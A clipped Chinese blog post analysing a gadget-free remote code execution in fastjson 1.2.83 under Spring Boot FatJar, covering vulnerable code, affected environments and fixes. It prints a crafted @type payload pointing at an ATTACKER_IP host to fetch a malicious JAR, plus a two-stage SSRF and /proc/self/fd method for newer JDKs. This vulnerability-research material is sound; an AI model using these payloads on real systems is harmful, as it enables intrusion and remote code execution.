---
title: 2026年了，核弹还是fastjson，fastjson1.2.83 RCE是怎么回事？ · LoRexxar's Blog | 信息技术分享
source: https://lorexxar.cn/2026/07/21/fs1-2-83rce/
source_host: lorexxar.cn
clip_date: 2026-09-08T18:17:25+08:00
trace_id: c796e523-aebf-417b-b02b-f69f468a65b6
content_hash: cbd9b97dcfd42e41d54fd4cfb9b272767401a55f338d75c7a5c63ffee9617bfd
status: synced
tags:
  - Fastjson
  - 漏洞分析
series: null
feed_source: LoRexxar
ai_summary: TL;DR：fastjson 1.2.83在Spring Boot FatJar环境下存在无需gadget的RCE，可利用LaunchedURLClassLoader远程加载带@JSONType的类并在静态初始化时执行代码。
ai_summary_style: key-points
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3d575244-d011-819a-97ab-f2ca1332f280
ioc:
  cves:
    - CVE-2026-60137
    - CVE-2026-63030
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：fastjson 1.2.83在Spring Boot FatJar环境下存在无需gadget的RCE，可利用LaunchedURLClassLoader远程加载带@JSONType的类并在静态初始化时执行代码。
> 
> - **漏洞范围：** 影响fastjson 1.2.68至1.2.83，无需指定expectClass，也与此前autoType绕过白名单的方式无关；仅启用SafeMode或迁移Fastjson2才能规避。
> - **核心利用点：** ParserConfig检测@JSONType时会把typeName中的`.`替换成`/`并拼接`.class`后交给ClassLoader.getResourceAsStream；通过构造类似`jar:http:..IP:port.exploit!.Payload`的类名，可让资源路径变成远程HTTP URL，下载恶意JAR并触发`<clinit>`执行。
> - **环境依赖：** 需要应用以Spring Boot FatJar方式运行（默认ClassLoader为LaunchedURLClassLoader），且URLClassPath包含`jar:file:`根；内嵌Tomcat/Jetty/Undertow均可利用，普通WAR部署或纯Tomcat环境因URLClassPath不含该根而不可利用。
> - **JDK版本限制：** JDK8可单次远程加载完成利用；更高版本会因defineClass校验类名中的`//`而失败，只能先通过SSRF将JAR下载到临时文件，再用`jar:file:/proc/self/fd/N`二次加载，因此Windows高版本JDK无法利用。
> - **作者复盘：** 本次分析大量使用AI辅助，AI显著提升效率，但多次给出关于Tomcat与SpringBoot联动环境的错误结论，需警惕AI在未知问题上滚雪球式误导。

7月19日，推上的一名安全研究员声称，他发现了一个在fastjson 1.2.83版本中无需gadget的RCE漏洞。一时间激起千帆浪。  
[![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bf55b9b15229df4b.png)](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221545781.png)

Fastjson虽然已经停止维护1版本，但是1版本的Fj依旧是互联网上应用最多的Java JSON库之一，虽然1.2.83没有在维护，但是在长期和fastjson对抗的时间里，83版本仅可以基于expectClass和第三方库构成的gadget做的极其有限的攻击利用，几乎无法RCE，所以很多厂家没有选择更新到FJ2增加不确定性。

**在过去的1天多时间内，基于作者的部分信息，大家正在逐渐探索出了漏洞的真相**。

在7月22日，原作者公开了他们的研究文档 [https://fearsoff.org/cn/research/fastjson-1-2-83-rce](https://fearsoff.org/cn/research/fastjson-1-2-83-rce)

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221545358.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b20e278d4b4e448a.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8e6c982979885a06.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a62532328c839ef2.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/09196d814e40d0c3.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/293fe9aad0ae2d92.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fce8a65d7b5be089.png)

![img](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dc3077b5fd63d815.png)

## 关于漏洞起始

在这篇推文激起了外网的讨论之后，原作者逐渐公布了一些关于漏洞的信息

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221545026.png)

-   该漏洞影响fastjson 1.2.68 -> 1.2.83
-   与autoType无关，只有启用SafeMode或者迁移到Fastjosn 2.x来解决

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221545713.png)

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221545797.png)

-   不需要指定expectClass，不需要控制第二个参数，也不是走我们以往基于白名单类的绕过途径

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221546290.png)

-   这个漏洞至少影响互联网上最常见的3个版本，8，17，21

在这样的基础上，很多安全研究者开启了AI时代最有效的推进分析，真相被一点点剥开水面

## 抽丝剥茧

事情破局的第一步很快到来，github上有人直接分享了该漏洞的poc（这个poc已经404了），由于我已经没有截图了，甚至这个poc的推送作者是Codex，非常搞笑

-   [https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC](https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC)

在这片文章里提到了一个很有趣的漏洞点

**Fastjson可以通过 Spring Boot FatJar 的 LaunchedURLClassLoader 来远程加载带有** `@JSONType` **注解的类，最终远程代码执行。无论是否开启autoType。**

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221546982.png)

在 Spring Boot FatJar 环境中时， **LaunchedURLClassLoader 会将类资源路径解释为 jar:http:// URL**，从而触发远程 HTTP 请求下载恶意 JAR，最终实现远程类加载和代码执行。

-   除了fastjson，还要求有springboot
-   **应用以 Spring Boot FatJar 方式运行（使用 LaunchedURLClassLoader）**
-   JDK 版本为 8

以下是Poc原文给出的依赖

```javascript
<properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
    <fastjson.version>1.2.83</fastjson.version>
    <spring.boot.loader.version>2.7.18</spring.boot.loader.version>
    <asm.version>9.6</asm.version>
</properties>
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>${fastjson.version}</version>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-loader</artifactId>
        <version>${spring.boot.loader.version}</version>
    </dependency>
    <dependency>
        <groupId>org.ow2.asm</groupId>
        <artifactId>asm</artifactId>
        <version>${asm.version}</version>
    </dependency>
</dependencies>
```

漏洞的实际利用很简单

在ParserConfig中，有这样一段代码

```javascript
// ParserConfig.java 第 1479-1503 行
boolean jsonType = false;
InputStream is = null;
try {
    // 关键：把类名中的 . 替换成 /，拼成资源路径
    String resource = typeName.replace('.', '/') + ".class";
    if (defaultClassLoader != null) {
        is = defaultClassLoader.getResourceAsStream(resource);  // ← 远程加载！
    }
    if (is != null) {
        ClassReader classReader = new ClassReader(is, true);
        TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
        classReader.accept(visitor);
        jsonType = visitor.hasJsonType();  // 检测 @JSONType 注解
    }
} catch (Exception e) { /* skip */ }

if (autoTypeSupport || jsonType || expectClassFlag) {  // ← jsonType=true 绕过第一层
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
}
```

fastjson会把请求中的`.`替换成 `/` ，然后拼接上`.class` 之后加载。

本意是把类似于正常的包，转为路径加载

```javascript
@type = "com.example.MyModel"
  → replace('.', '/') → "com/example/MyModel.class"
  → getResourceAsStream → 从本地 classpath 加载
  → 检测 @JSONType → 信任
  → loadClass → 正常业务类
```

但是这里就出现了几个华点

由于请求中的`.`替换成 `/` ，那么就可以通过构造`.`来绕过正常的限制

```javascript
输入jar:http:..ATTACKER_IP:18080.exploit!.Payload
其中http:..转化为http://
其中ATTACKER_IP:18080.exploit转化为ATTACKER_IP:18080/exploit
其中!.转化为!/

最后一个问题是ip里的.也会被转义，那么更简单直接用整形ip
2130706433:18080 -> 127.0.0.1:18080
```

所以最后通过巧妙的构造就可以实现远程加载poc

上一个poc由3个部分构成

**1、** `replace('.', '/')` **的意外导致了巧妙的构建，绕过了对于/的限制，也侧面绕开了对于远程加载的限制**

```javascript
// ClassLoader.java
private ProtectionDomain preDefineClass(String name, ProtectionDomain pd) {
    ...
    if (name.indexOf('/') != -1) {
        throw new NoClassDefFoundError("IllegalName: " + name);
    }
    ...
}
```

**2、Spring Boot 的类加载器能解析 jar:http:// 嵌套 URL（这是 Spring Boot FatJar 加载嵌套 JAR 的正常功能）**

**3、** `@JSONType 注解` **这个路径入口没有被额外限制，允许远程加载**

这条链路远程加载回来的类被defineClass后，静态初始化块 `<clinit>` 会立即执行，不会走到后续的类型绑定，所以其他的限制也无效。

```javascript
parseObject(body, Dto.class) 生效之前的probe阶段就执行
```

但是问题接踵而至，如果原漏洞使用了这个路径，那么在高于JDK8的版本有这样一个限制

```javascript
Class<?> loadClassInLaunchedClassLoader(String name) {
    String resource = name.replace('.', '/') + ".class";  
// 构建资源路径

    InputStream is = getParent().getResourceAsStream(resource);  
// 下载

    byte[] bytes = readAll(is);
    return defineClass(name, bytes, 0, bytes.length);  //校验name
}
```

在远程加载成功之后，紧接着defineclass，不同版本的jdk会有不同的限制

```javascript
defineClass(name, 字节码bytes)
  │
  ├─ Java层: preDefineClass
  │    checkName(name参数)
  │    → 校验的是 传入的name字符串
  │    → 点号形式没有/，通过
  │
  └─ native层: defineClass1 → parseClassFile
       │
       ├─ 第一轮: 把字节码解析成常量池结构
       │    → 此时常量池里的类名是字节码原始值
       │    → 即 "jar:http://a/b/c!/Foo"（JVM内部格式，用/分隔）
       │
       └─ 第二轮: 遍历常量池，校验每个条目格式
            遇到 CONSTANT_UnresolvedClass 时:
            → verify_legal_class_name(常量池中的类名)
              → verify_unqualified_name()
// 的 // 通过
// → http:// 的 // 被拒
```

**这个限制让超过JDK8的版本只能触发ssrf，无法直接远程加载。**

简单来说就是无法绕过高版本对于defineClass判定的限制。 **getResourceAsStream可以实现远程请求**，但是defineClass判定的时候类名校验失败。

于是衍生出了第二个高版本利用的方案，用 `jar:file:`来绕过双斜杠的协议协议。

```javascript
阶段一：SSRF 下载 JAR 到本地
  getResourceAsStream("jar:http://attacker/probe!/POC.class")
  → 标准 ClassLoader 返回 null，但 LaunchedURLClassLoader
    的底层 URL 解析机制会触发 HTTP 请求（下载 JAR 到临时文件）
  → JAR 落盘到 /tmp 或内存中，拿到文件描述符 fd/N

阶段二：本地加载
  getResourceAsStream("jar:file:/proc/self/fd/N!/POC.class")
  → 本地文件，单斜杠，通过 verify_unqualified_name
  → defineClass 成功，<clinit> 执行
```

也就是用ssrf来抓取文件到临时文件，然后遍历fd寻找这个临时文件，通过jarfile协议加载，这样就可以绕过高版本对于 `//` 的额外限制，顺利的在高版本做利用。

而这个遍历fd的利用方案也导致该问题再windows的高版本jdk中无法利用。

**但是有没有觉得好像哪里都不太对？**

## 看上去好像哪里不对？

在顺着分析了上一个poc的详细流程以及链路之后，我想所有人应该都会得出一个问题就是， **为什么会有这样一个远程加载的classloader呢？**

很显然，最早的POC在探索这个链路的时候，自己构造了一个Classloader来闭环整个链路

```javascript
ClassLoader urlNameClassLoader = new ClassLoader(null) {
    @Override
    public InputStream getResourceAsStream(String name) {
        return new URL(name).openStream();  
    }
};
config.setDefaultClassLoader(urlNameClassLoader);
config.checkAutoType(TYPE, null);
```

在这个 PoC 中， `getResourceAsStream()` **接收到的** `name` **会直接交给** `new URL(name)` **解析**；如果 `name` 是一个远程 URL，就可能发起网络请求并读取远端内容。因此，后续链路才能闭环。

**普通的Classloader，常规功能是在本地 classpath 里寻找对应的文件，找不到就返回null。** 所以大部分的Classloader并不支持这样一条链路。

\-—–

SpringBoot Fat Jar算是一个特例， `**LaunchedURLClassLoader.findResource**` **直接把name喂回了URLClassLoader，而URLClassPath的通用Loader将name根据不同格式解析**，最后构成了利用链路。

```javascript
URLClassLoader.findResource(name)
    -> URLClassPath.findResource(name)
        -> 针对每个 classpath 根选择 Loader
```

那么又有了一个新的问题， **除了SpringBoot Fat Jar，其他的URLClassLoader为什么不会远程加载？** 尤其是Tomcat正常的WebappClassLoader也继承自URLClassLoader，并且JDK远程就支持 `jar` 协议， **那为什么Tomcat下无法利用呢？**

**这个问题比想象的要复杂，以下这部分内容我修改了3次…**

**首先运行Fat jar的容器也会影响到利用链路**。

使用Fat jar启动时，J **VM默认的Classloader就是LaunchedURLClassLoader**。而不同的容器的TCCL运行模式不一样，由于Fastjson用的是当前线程的ClassLoader，那么Tomcat会把他替换TomcatEmbeddedWebappClassLoader

| 容器  | TCCL |
| --- | --- |
| **Tomcat** | `TomcatEmbeddedWebappClassLoader` |
| **Jetty** | `LaunchedURLClassLoader` |
| **Undertow** | `LaunchedURLClassLoader` |

但是 **Tomcat+SpringBoot Fatjar其实也是可以利用的**，因为 **TomcatEmbeddedWebappClassLoader同样继承了URLClassLoader**，但是重写了 loadClass，做了额外的限制不允许连续 `/` 输入，所以禁止了http链路，但同样可以走ssrf+遍历fd的方式利用。

只不过即便在JDK8环境下，依旧不能单次请求利用了。

那是不是必须是Fat jar呢， **直接war部署在Tomcat/Jetty可以吗？**

在Tomcat的WebappClassLoader，在资源查找的时候，会直接走WebResourceRoot然后在本地查找

```javascript
String path = nameToPath(name);
resource = resources.getClassLoaderResource(path);
if (resource.exists()) {
    url = resource.getURL();
}
```

WebappClassLoaderBase不会做URL解析，在查找不到会返回null

```javascript
TomcatEmbeddedWebappClassLoader.getResourceAsStream("jar:http://...")  
  → WebappClassLoaderBase.getResource
```

而 **当WebappClassLoaderBase搜索不到的时候如果hasExternalRepositories为true会回退到父类URLClassLoader的findResource，依旧可以触发利用链路**

```javascript
public URL findResource(String name) {
    String path = nameToPath(name);  
    WebResource resource = resources.getClassLoaderResource(path);
  
    URL url = null;
    if (resource.exists()) {
        url = resource.getURL();
    }
//  回退到URLClassLoader
    if (url == null && hasExternalRepositories) {
        url = super.findResource(name);
    }
```

而实际测试中， **通过war方式部署在tomcat上，这个属性默认为false**，所以利用链走不通。

| 部署方式 | TCCL | URLClassPath | 自定义 `jar:` Handler | 结果  |
| --- | --- | --- | --- | --- |
| SB Fat JAR（内嵌 Tomcat） | `TomcatEmbeddedWebappClassLoader` （parent 有 `jar:file:`） | 空/ `jar:file:` | ✅   | **可利用** |
| SB Fat JAR（内嵌 Jetty） | `LaunchedURLClassLoader` | `jar:file:` | ✅   | **可利用** |
| SB Fat JAR（内嵌 Undertow） | `LaunchedURLClassLoader` | `jar:file:` | ✅   | **可利用** |
| SB WAR（外部 Tomcat） | `ParallelWebappClassLoader` | `file:` | ❌   | **不可利用** |
| SB WAR（外部 Jetty） | `WebAppClassLoader` | `file:` | ❌   | **不可利用** |
| 纯 Tomcat + Fastjson | `ParallelWebappClassLoader` | `file:` | ❌   | **不可利用** |

* * *

**那么为什么是SPringBoot呢？**

除了前面不是条件的条件以外，想要走通这条链路。

**还必须要求当前URLClassPath必须包含jar:file根。**

而Spring Boot 为了加载依赖。他会构造类似于jar:file的嵌套根

```javascript
jar:file:/path/app.jar!/BOOT-INF/classes!/
```

-   `file:/path/to.jar` → URLClassPath 创建 JarLoader → 这个 JarLoader 只管 **在该 JAR 内部查找 entry**。它用的是 **标准 JDK 的** `jar:` **协议处理器**，只能处理 `jar:file:` 本地 URL。
-   `jar:file:/path/to.jar!/` → URLClassPath 创建 JarLoader → Spring Boot 启动时通过 `registerUrlProtocolHandler()` 注册了 **自定义** `jar:` **协议处理器**。当这个 JarLoader 遇到资源名 `jar:http://...` 时，自定义处理器能把它解析为远程 URL，触发 SSRF。

所以Spring Boot Fat Jar 是已知容易满足该 URL 解析条件的环境之一

这样一来，这个漏洞的限定条件就变成了

-   **该fastjson环境下的默认Classloader，继承URLClassLoader（或复用 URLClassPath），没有做额外的URLLoader限制，并且当前URLClasspath必须包含jar:file根，即可存在利用**

## 作者公开原文

在漏洞细节被逐步推演出来之后，在7月22日，漏洞最早的发现者公开了他们研究的细节。

[https://fearsoff.org/cn/research/fastjson-1-2-83-rce](https://fearsoff.org/cn/research/fastjson-1-2-83-rce)

有趣的是，相比于我们的AI复现逻辑，该作者挖掘漏洞的逻辑源于一个偶然，就像我说的，这种利用链路在常规的环境下是无法完成的，但是如果刚好复现中触发了远程加载后续的很多想法都顺利成章，所以最早的巧合就很有趣。

[](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607221546597.png)

在完成的复盘完漏洞之后，内心还是百感交易，一方面基于AI的探索和漏洞挖掘体系逐渐变得熟练和成熟，AI能做的事情越来越多，另一方面也感叹，居然这种已经被研究烂了的目标还能巧妙的找到新的利用角度，任重而道远~

坦白讲这是我第一次以AI为主做漏洞复现和分析，在这个新时代下，效率的提升和未知领域的帮助AI提升巨大，但反过来，AI在未知位置隐藏的错误信息也可能会滚雪球误导，中间关于tomcat实际环境与SPringBoot联动问题在我3次和AI探讨都获得了不同的答案，如何避免这样的事情可能是接下来最重要的事情。

-   Next Post
    
    [
    
    Wordpress wp2shell 未授权RCE（CVE-2026-63030 / CVE-2026-60137）
    
    ](https://lorexxar.cn/2026/07/24/wp2shell/ "Wordpress wp2shell 未授权RCE（CVE-2026-63030 / CVE-2026-60137）")

CATALOG
